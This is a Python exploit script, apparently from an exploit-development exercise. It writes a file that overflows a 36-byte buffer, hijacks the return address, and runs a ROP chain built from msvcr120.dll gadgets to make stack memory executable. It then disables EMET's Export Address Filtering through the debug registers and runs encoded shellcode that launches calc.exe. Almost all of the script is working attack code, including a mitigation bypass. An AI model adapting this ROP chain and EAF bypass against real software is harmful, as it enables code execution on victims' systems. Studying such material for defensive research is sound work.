import struct

msvcr120 = 0x73c60000

# Delta used to fix the addresses based on the new base address of msvcr120.dll.
md = msvcr120 - 0x70480000


def create_rop_chain(code_size):
    rop_gadgets = [
        # ecx = esp
        md + 0x704af28c,     # POP ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0xffffffff,
        md + 0x70532761,     # AND ECX,ESP # RETN    ** [MSVCR120.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}

        # ecx = args+8 (&endAddress)
        md + 0x704f4681,     # POP EBX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        75*4,
        md + 0x7054b28e,     # ADD ECX,EBX # POP EBP # OR AL,0D9 # INC EBP # OR AL,5D # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,

        # address = ptr to address
        md + 0x704f2487,     # MOV EAX,ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704846b4,     # XCHG EAX,EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704e986b,     # MOV DWORD PTR [ECX],EDX # POP EBP # RETN 0x04    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7048f607,     # RETN (ROP NOP) [MSVCR120.dll]
        0x11111111,          # for RETN 0x04

        # ecx = args+4 (ptr to &address)
        md + 0x704f4681,     # POP EBX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0xfffffff0,
        md + 0x7054b28e,     # ADD ECX,EBX # POP EBP # OR AL,0D9 # INC EBP # OR AL,5D # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,

        # &address = ptr to address
        md + 0x704e986b,     # MOV DWORD PTR [ECX],EDX # POP EBP # RETN 0x04    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7048f607,     # RETN (ROP NOP) [MSVCR120.dll]
        0x11111111,          # for RETN 0x04

        # ecx = args+8 (ptr to &size)
        md + 0x705370e0,     # INC ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x705370e0,     # INC ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x705370e0,     # INC ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x705370e0,     # INC ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}

        # edx = ptr to size
        md + 0x704e4ffe,     # INC EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704e4ffe,     # INC EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704e4ffe,     # INC EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704e4ffe,     # INC EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}

        # &size = ptr to size
        md + 0x704e986b,     # MOV DWORD PTR [ECX],EDX # POP EBP # RETN 0x04    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7048f607,     # RETN (ROP NOP) [MSVCR120.dll]
        0x11111111,          # for RETN 0x04

        # edx = args
        md + 0x704f2487,     # MOV EAX,ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x7053fe65,     # SUB EAX,2 # POP EBP # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7053fe65,     # SUB EAX,2 # POP EBP # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7053fe65,     # SUB EAX,2 # POP EBP # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x7053fe65,     # SUB EAX,2 # POP EBP # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        md + 0x704846b4,     # XCHG EAX,EDX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}

        # EAX = ntdll!RtlExitUserThread
        md + 0x7053b8fb,     # POP EAX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x7056507c,     # IAT: &ntdll!RtlExitUserThread
        md + 0x70501e19,     # MOV EAX,DWORD PTR [EAX] # POP ESI # POP EBP # RETN    ** [MSVCR120.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}
        0x11111111,
        0x11111111,

        # EAX = ntdll!NtQueryInformationThread
        md + 0x7049178a,     # ADD EAX,8 # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x7049178a,     # ADD EAX,8 # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x7049178a,     # ADD EAX,8 # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704a691c,     # ADD EAX,DWORD PTR [EAX] # RETN    ** [MSVCR120.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}
        md + 0x704ecd87,     # ADD EAX,4 # POP ESI # POP EBP # RETN 0x04    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x11111111,
        0x11111111,
        md + 0x7048f607,     # RETN (ROP NOP) [MSVCR120.dll]
        0x11111111,          # for RETN 0x04

        # EAX -> "call dword ptr fs:[0C0h] # add esp,4 # ret 14h"
        md + 0x7049178a,     # ADD EAX,8 # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704aa20f,     # INC EAX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704aa20f,     # INC EAX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x704aa20f,     # INC EAX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}

        # EBX -> "call dword ptr fs:[0C0h] # add esp,4 # ret 14h"
        md + 0x704819e8,     # XCHG EAX,EBX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}

        # ECX = 0; EAX = 0x4d
        md + 0x704f2485,     # XOR ECX,ECX # MOV EAX,ECX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        md + 0x7053b8fb,     # POP EAX # RETN    ** [MSVCR120.dll] **   |   {PAGE_EXECUTE_READ}
        0x4d,

        md + 0x704c0a08,     # JMP EBX
        md + 0x7055adf3,     # JMP ESP
        0x11111111,          # for RETN 0x14
        0x11111111,          # for RETN 0x14
        0x11111111,          # for RETN 0x14
        0x11111111,          # for RETN 0x14
        0x11111111,          # for RETN 0x14

    # real_code:
        0x90901eeb,          # jmp skip

    # args:
        0xffffffff,          # current process handle
        0x11111111,          # &address = ptr to address
        0x11111111,          # &size = ptr to size
        0x40,
        md + 0x705658f2,     # &Writable location [MSVCR120.dll]
    # end_args:
        0x11111111,          # address     <------- the region starts here
        code_size + 8        # size
    # skip:
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


def write_file(file_path):
    with open(file_path, 'wb') as f:
        ret_eip = md + 0x7048f607       # RETN (ROP NOP) [MSVCR120.dll]
        shellcode = (
            "\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02" +
            "\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa" +
            "\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8" +
            "\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02" +
            "\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45" +
            "\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6" +
            "\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c" +
            "\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0" +
            "\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53" +
            "\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45" +
            "\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2" +
            "\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b" +
            "\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff" +
            "\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0" +
            "\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75" +
            "\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d" +
            "\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c" +
            "\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24" +
            "\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04" +
            "\x30\x03\xc6\xeb\xdd")
        disable_EAF = (
            "\xB8\x50\x01\x00\x00" +            # mov    eax,150h
            "\x33\xC9" +                        # xor    ecx,ecx
            "\x81\xEC\xCC\x02\x00\x00" +        # sub    esp,2CCh
            "\xC7\x04\x24\x10\x00\x01\x00" +    # mov    dword ptr [esp],10010h
            "\x89\x4C\x24\x04" +                # mov    dword ptr [esp+4],ecx
            "\x89\x4C\x24\x08" +                # mov    dword ptr [esp+8],ecx
            "\x89\x4C\x24\x0C" +                # mov    dword ptr [esp+0Ch],ecx
            "\x89\x4C\x24\x10" +                # mov    dword ptr [esp+10h],ecx
            "\x89\x4C\x24\x14" +                # mov    dword ptr [esp+14h],ecx
            "\x89\x4C\x24\x18" +                # mov    dword ptr [esp+18h],ecx
            "\x54" +                            # push   esp
            "\x6A\xFE" +                        # push   0FFFFFFFEh
            "\x8B\xD4" +                        # mov    edx,esp
            "\x64\xFF\x15\xC0\x00\x00\x00" +    # call   dword ptr fs:[0C0h]
            "\x81\xC4\xD8\x02\x00\x00"          # add    esp,2D8h
        )
        code = disable_EAF + shellcode
        name = 'a'*36 + struct.pack('<I', ret_eip) + create_rop_chain(len(code)) + code
        f.write(name)

write_file(r'c:\deleteme\name.dat')
